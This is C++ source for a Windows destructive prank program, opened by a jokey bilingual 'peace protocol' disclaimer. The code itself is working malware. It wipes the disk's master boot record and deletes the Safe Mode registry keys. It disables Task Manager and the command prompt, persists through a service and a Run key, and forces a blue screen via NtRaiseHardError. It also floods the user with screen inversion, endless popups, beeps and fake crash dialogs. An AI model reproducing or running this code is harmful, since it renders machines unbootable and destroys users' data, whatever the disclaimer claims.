//g++ -o _.exe _.cpp _.o -lgdi32 -lole32 -lshell32 -ladvapi32 -lwer -lwinmm -mwindows -static -finput-charset=GBK -fexec-charset=GBK
/*
 * ======================================================================
 *                    宇 宙 和 平 协 议 / 免 责 声 明
 *                  UNIVERSAL PEACE PROTOCOL & DISCLAIMER
 * ======================================================================
 * 
 * 本软件（以下简称"它"）仅供教育、研究、虚拟机环境测试使用。
 * 
 * 使用条款：
 *   1. 使用者须在隔离的虚拟机环境中运行，不得在物理机上执行。
 *   2. 使用者须拥有所运行设备的完全所有权。
 *   3. 使用者须明确知晓：MBR 破坏功能将导致系统无法启动。
 *   4. 使用者须独自承担所有因使用本软件造成的后果。
 *   5. 本软件不针对任何个人、组织、学校、政府或外星文明。
 *   6. 若你因好奇害死猫，那是猫的问题，不是代码的问题。
 *   7. 作者保留随时删除此代码并装作什么都没发生的权利。
 * 
 * 免责声明：
 *   本软件不包含任何恶意意图（真的）。
 *   作者不对以下情况负责：
 *     - 你的电脑炸了
 *     - 你的数据没了
 *     - 你的老师/老板/女朋友/猫不跟你说话了
 *     - 你被请去喝茶
 *     - 你试图用这个来炸学校电脑，结果自己先被炸了
 *     - 宇宙大爆炸（不是我们干的）
 * 
 * 宇宙和平原则：
 *   - 不要伤害自己
 *   - 不要伤害他人
 *   - 不要伤害虚拟机以外的任何东西
 *   - 不要在学校/公司/公共场所运行
 *   - 分享代码时删除 MBR 部分，做个好人
 *   - 保持好奇心，但要善良
 * 
 * 如果你不同意以上条款，请：
 *   1. 立刻停止使用
 *   2. 删除所有相关文件
 * 
 * 作者：bigbluemonkey
 * 日期：地球时间 2026
 * 版本：11.45.14，真的只是看看
 * 
 * ======================================================================
 *  愿宇宙和平，愿代码只为知识而存在，愿所有虚拟机都安好。
 *  PEACE OUT. 
 * ======================================================================
 */
/*
 * ======================================================================
 *              UNIVERSAL PEACE PROTOCOL & DISCLAIMER
 * ======================================================================
 * 
 * This software (hereinafter referred to as "It") is for educational,
 * research, and virtual machine testing purposes only.
 * 
 * Terms of Use:
 *   1. The user must run It in an isolated virtual machine environment.
 *   2. The user must own the device on which It is executed.
 *   3. The user acknowledges that the MBR destruction function will
 *      render the system unbootable.
 *   4. The user assumes all consequences of using this software.
 *   5. It is not targeted at any individual, organization, school,
 *      government, or extraterrestrial civilization.
 *   6. Curiosity killed the cat. That's the cat's problem, not the code's.
 *   7. The author reserves the right to delete this code and pretend
 *      nothing ever happened.
 * 
 * Disclaimer:
 *   This software contains no malicious intent (really).
 *   The author is NOT responsible for:
 *     - Your computer exploding
 *     - Your data vanishing
 *     - Your teacher/boss/girlfriend/cat not talking to you
 *     - You being invited for tea by authorities
 *     - You trying to nuke school computers but getting nuked first
 *     - The Big Bang (wasn't us)
 * 
 * Universal Peace Principles:
 *   - Don't hurt yourself
 *   - Don't hurt others
 *   - Don't hurt anything outside a virtual machine
 *   - Don't run this at school/work/public places
 *   - Delete the MBR part when sharing code. Be a good person.
 *   - Stay curious, but stay kind.
 * 
 * If you disagree with the above terms, please:
 *   1. Stop using It immediately
 *   2. Delete all related files
 * 
 * Author: bigbluemonkey
 * Date: Earth Time 2026
 * Version: 11.45.14, just looking, really
 * 
 * ======================================================================
 *  May the universe be at peace. May code exist only for knowledge.
 *  May all virtual machines stay safe.
 *  PEACE OUT.
 * ======================================================================
 */
#include<bits/stdc++.h>
#include<windows.h>
#include<shellapi.h>
#include<werapi.h>
#include<winable.h>
using namespace std;
LPCWSTR lpPaths[13]={L"explorer.exe",L"taskmgr.exe",L"winlogon.exe",L"csrss.exe",L"dwm.exe",L"cmd.exe",L"svchost.exe",L"conhost.exe",L"smss.exe",L"wininit.exe",L"werfault.exe",L"winver.exe",L"regedit.exe"};
HCRYPTPROV prov;
int random(){
    if(prov==0)if(!CryptAcquireContext(&prov,NULL,NULL,PROV_RSA_FULL,CRYPT_SILENT|CRYPT_VERIFYCONTEXT))ExitProcess(1);
    int out;
    CryptGenRandom(prov,sizeof(out),(BYTE*)(&out));
    return out&0x7fffffff;
}
int WINAPI ReportError(LPCWSTR lpPath,LPCWSTR lpCloseText,LPCWSTR lpDescription){
    HREPORT hReport;
    WER_REPORT_INFORMATION wri;
    ZeroMemory(&wri,sizeof(wri));
    wri.dwSize=sizeof(wri);
    wri.hProcess=GetCurrentProcess();
    lstrcpyW(wri.wzApplicationPath,lpPath);
    _WER_SUBMIT_RESULT wsr;
    WerReportCreate(L"Stopworking",WerReportApplicationCrash,&wri,&hReport);
    WerReportSetUIOption(hReport,WerUIIconFilePath,lpPath);
    if(lpCloseText)WerReportSetUIOption(hReport,WerUICloseText,lpCloseText);
    if(lpDescription){
        WCHAR DlgHeader[565];
        wsprintfW(DlgHeader,L"%s 已停止工作",lpDescription);
        WerReportSetUIOption(hReport,WerUIIconFilePath,lpPath);
        WerReportSetUIOption(hReport,WerUIConsentDlgHeader,DlgHeader);
    }
    WerReportSubmit(hReport,WerConsentAlwaysPrompt,1024|8,&wsr);
    WerReportCloseHandle(hReport);
    return GetLastError();
}
void ramdompop(){
    DWORD tid;
    int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
    int cx,cy;
    for(int i=0;i<13;i++){
        LPCWSTR lpDescription=(random()%3==0)?lpPaths[i]:NULL;
        ReportError(lpPaths[i],L"确定程序关闭",lpDescription);
        Sleep(50);
        HWND hwnd=GetForegroundWindow();
        RECT rc;
        if(hwnd){
            GetWindowRect(hwnd,&rc);
            cx=rc.right-rc.left,cy=rc.bottom-rc.top;
            SetWindowPos(hwnd,HWND_TOPMOST,random()%(w-cx),random()%(h-cy),0,0,SWP_NOSIZE);
        }
        Sleep(50+random()%50);
    }
}
HHOOK g_hMouseHook;
HWND g_hOverlay;
HICON* g_icons;
int g_iconCount;
void LoadIcons(){
    g_iconCount=ExtractIconExW(L"shell32.dll",-1,NULL,NULL,0);
    g_icons=new HICON[g_iconCount];
    for(int i=0;i<g_iconCount;i++)ExtractIconExW(L"shell32.dll",i,NULL,&g_icons[i],1);
}
void FreeIcons(){
    for(int i=0;i<g_iconCount;i++)DestroyIcon(g_icons[i]);
    delete[] g_icons;
}
void DropIcon(int x,int y){
    HICON hIcon=g_icons[rand()%g_iconCount];
    HWND h=CreateWindowExW(0,L"_",NULL,WS_POPUP|SS_ICON,x-24,y-24,48,48,NULL,NULL,NULL,NULL);
    SendMessageW(h,STM_SETICON,(WPARAM)hIcon,0);
    ShowWindow(h,SW_SHOWNOACTIVATE);
}
LRESULT CALLBACK OverlayProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    switch(msg){
        case WM_PAINT:{
            PAINTSTRUCT ps;
            HDC hdc=BeginPaint(hWnd,&ps);
            HICON hIcon=g_icons[rand()%g_iconCount];
            DrawIconEx(hdc,0,0,hIcon,48,48,0,NULL,DI_NORMAL);
            EndPaint(hWnd,&ps);
            return 0;
        }
    }
    return DefWindowProcW(hWnd,msg,wParam,lParam);
}
LRESULT CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam){
    if(nCode==HC_ACTION&&wParam==WM_MOUSEMOVE){
        POINT pt;
        GetCursorPos(&pt);
        SetWindowPos(g_hOverlay,HWND_TOPMOST,pt.x-24,pt.y-24,48,48,SWP_NOACTIVATE);
        InvalidateRect(g_hOverlay,NULL,FALSE);
        MSLLHOOKSTRUCT* p=(MSLLHOOKSTRUCT*)lParam;
        DropIcon(p->pt.x,p->pt.y);
    }
    return CallNextHookEx(g_hMouseHook,nCode,wParam,lParam);
}
int MouseIconsRain(HINSTANCE hInstance){
    srand(GetTickCount());
    LoadIcons();
    WNDCLASSW wc={0};
    wc.lpfnWndProc=OverlayProc;
    wc.hInstance=hInstance;
    wc.hCursor=LoadCursorW(NULL,(LPCWSTR)IDC_ARROW);
    wc.hbrBackground=(HBRUSH)GetStockObject(NULL_BRUSH);
    wc.lpszClassName=L"_";
    RegisterClassW(&wc);
    g_hOverlay=CreateWindowExW(WS_EX_LAYERED|WS_EX_TOPMOST|WS_EX_NOACTIVATE,L"_",NULL,WS_POPUP,0,0,48,48,NULL,NULL,hInstance,NULL);
    SetLayeredWindowAttributes(g_hOverlay,RGB(0,0,0),0,LWA_COLORKEY);
    ShowWindow(g_hOverlay,SW_SHOW);
    g_hMouseHook=SetWindowsHookExW(WH_MOUSE_LL,MouseProc,hInstance,0);
    MSG msg;
    while(GetMessageW(&msg,NULL,0,0)){TranslateMessage(&msg);DispatchMessageW(&msg);}
    UnhookWindowsHookEx(g_hMouseHook);
    FreeIcons();
    return 0;
}
void ForceBSOD(){
    HMODULE ntdll=GetModuleHandleW(L"ntdll.dll");
    typedef NTSTATUS(NTAPI *pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
    typedef NTSTATUS(NTAPI *pNtRaiseHardError)(NTSTATUS,ULONG,ULONG,PVOID*,ULONG,PULONG);
    pRtlAdjustPrivilege RtlAdj=(pRtlAdjustPrivilege)GetProcAddress(ntdll,"RtlAdjustPrivilege");
    pNtRaiseHardError NtRaise=(pNtRaiseHardError)GetProcAddress(ntdll,"NtRaiseHardError");
    BOOLEAN enabled;
    RtlAdj(19,TRUE,FALSE,&enabled);
    ULONG resp;
    NtRaise(0xC000021A,0,0,NULL,6,&resp);
}
int Tunnel(HINSTANCE hInstance){
    SetProcessDPIAware();
    int w=GetSystemMetrics(SM_CXSCREEN);
    int h=GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen=GetDC(NULL);
    while(true){
        HDC hdcMem=CreateCompatibleDC(hdcScreen);
        HBITMAP hbm=CreateCompatibleBitmap(hdcScreen,w,h);
        SelectObject(hdcMem,hbm);
        BitBlt(hdcMem,0,0,w,h,hdcScreen,0,0,SRCCOPY);
        float s=1.0;
        for(int i=0;i<20;i++){
            s*=0.97;
            int nw=w*s;
            int nh=h*s;
            int x=(w-nw)/2;
            int y=(h-nh)/2;
            StretchBlt(hdcScreen,x,y,nw,nh,hdcMem,0,0,w,h,SRCCOPY);
        }
        int dx=rand()%4-2;
        int dy=rand()%4-2;
        BitBlt(hdcScreen,dx,dy,w,h,hdcMem,0,0,SRCCOPY);
        DeleteObject(hbm);
        DeleteDC(hdcMem);
        Sleep(15);
    }
    ReleaseDC(NULL,hdcScreen);
    return 0;
}
void Inverse(){
    SetProcessDPIAware();
    while(1){
        HWND hDesktop=GetDesktopWindow();
        HDC hdc=GetWindowDC(hDesktop);
        RECT rect;
        GetWindowRect(hDesktop,&rect);
        int width=rect.right-rect.left;
        int height=rect.bottom-rect.top;
        BitBlt(hdc,0,0,width,height,hdc,0,0,NOTSRCCOPY);
        Sleep(50);
    }
}
void ShakeMouse(){
    POINT pt;
    GetCursorPos(&pt);
    while(true){
        GetCursorPos(&pt);
        int dx=(rand()%7)-3;
        int dy=(rand()%7)-3;
        int nx=pt.x+dx;
        int ny=pt.y+dy;
        int w=GetSystemMetrics(SM_CXSCREEN);
        int h=GetSystemMetrics(SM_CYSCREEN);
        if(nx<0)nx=0;
        if(nx>=w)nx=w-1;
        if(ny<0)ny=0;
        if(ny>=h)ny=h-1;
        SetCursorPos(nx,ny);
        Sleep(30);
    }
}
void Popup(){
    thread([]{
        while(true){
            MessageBoxW(NULL,L"",L"",MB_OK);
            Sleep(100);
        }
    }).detach();
    Sleep(30000);
    MessageBoxW(NULL,L"Still use your computer?",L"_",MB_OK|MB_ICONQUESTION);
    MessageBoxW(NULL,L"Give up struggling.",L"_",MB_OK|MB_ICONINFORMATION);
}
void CrazyBeepMulti(){
    for(int i=0;i<3;i++){
        thread([]{
            while(true)Beep(rand()%2000+200,rand()%100+50);
        }).detach();
    }
    while(true)Beep(rand()%2000+200,rand()%100+50);
}
void Lock(){
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&hKey,NULL);
    DWORD val=1;
    RegSetValueExW(hKey,L"DisableTaskMgr",0,REG_DWORD,(BYTE*)&val,sizeof(val));
    RegCloseKey(hKey);
    HKEY hKey2;
    RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&hKey2,NULL);
    RegSetValueExW(hKey2,L"DisableCMD",0,REG_DWORD,(BYTE*)&val,sizeof(val));
    RegCloseKey(hKey2);
}
void startup(string path1){
    system((string("sc create _ type=own start=auto binpath=")+path1).c_str());
    HKEY hKey;
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL,path,MAX_PATH);
    RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_SET_VALUE,NULL,&hKey,NULL);
    RegSetValueExW(hKey,L"_",0,REG_SZ,(BYTE*)path,(lstrlenW(path)+1)*2);
    RegCloseKey(hKey);
}
void ChangeMBR(){
    HANDLE hDisk=CreateFileA("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    unsigned char mbr[512]={0};
    DWORD writed;
    WriteFile(hDisk,mbr,512,&writed,NULL);
    CloseHandle(hDisk);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE,L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
    RegDeleteKeyW(HKEY_LOCAL_MACHINE,L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network");
}
int main(int argc,char** argv){
    SetProcessDPIAware();
    srand(GetTickCount());
    int choise=MessageBoxW(NULL,L"This is a virus!!!\nIt will break your computer!!!",L"Warning",MB_ICONWARNING|MB_YESNO);
    if(choise==IDNO)return 0;
    choise=MessageBoxW(NULL,L"This is the last warning!!!\nIt will break your computer!!!",L"Warning",MB_ICONWARNING|MB_YESNO);
    if(choise==IDNO)return 0;
    startup(argv[0]);
    ChangeMBR();
    Lock();
    Sleep(3000);
    thread(ShakeMouse).detach();
    Sleep(30000);
    thread(Inverse).detach();
    Sleep(3000);
    //thread(ramdompop).detach(); //Use this code when the memory enough
    thread(CrazyBeepMulti).detach();
    thread(Popup).detach();
    Sleep(3000);
    thread([]{Tunnel(GetModuleHandle(NULL));}).detach();
    thread([]{Sleep(30000);ForceBSOD();}).detach();
    MouseIconsRain(GetModuleHandle(NULL));
    return 0;
}
